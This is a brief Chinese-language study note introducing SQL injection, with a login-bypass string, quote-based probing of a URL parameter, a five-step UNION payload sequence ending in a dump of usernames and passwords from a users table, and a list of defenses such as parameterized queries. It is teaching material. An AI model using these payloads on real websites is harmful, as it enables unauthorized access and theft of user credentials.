# 我的新笔记测试：SQL注入入门速记

> 这是我手动新加入的测试笔记，用来验证"自动收录"功能。

## 一、SQL注入是什么？

通俗比喻：**网站登录框 = 小区门禁 + 保安登记本。** 你在"用户名"那栏写 `1' OR '1'='1`，相当于你在登记本上写了一句，保安看了自动当成真，把你放进去了——这就是把"你填的内容"当成了"SQL命令"来执行。

## 二、最简单的测试步骤

1. 找到带参数的 URL，例如：`/news.php?id=1`
2. 在后面加个单引号：`/news.php?id=1'`
3. 如果页面报错 / 内容变了 → 大概率有注入

## 三、UNION 注入 5 步法

```
1' ORDER BY 3--             → 猜字段数（2~10一个个试）
1' UNION SELECT 1,2,3--    → 看哪个字段号回显
1' UNION SELECT 1,@@version,3--  → 拿数据库版本
1' UNION SELECT 1,table_name,3 FROM information_schema.tables--
1' UNION SELECT 1,username||'|'||password,3 FROM users--
```

## 四、防御方法

- 永远用**预编译 + 参数化查询**（PDO / mybatis #{} / 预编译语句）
- 输入严格白名单校验
- WAF 作为第二道防线

## 五、总结

> 记住：**凡是把用户输入拼进 SQL 的，99% 都有洞。**
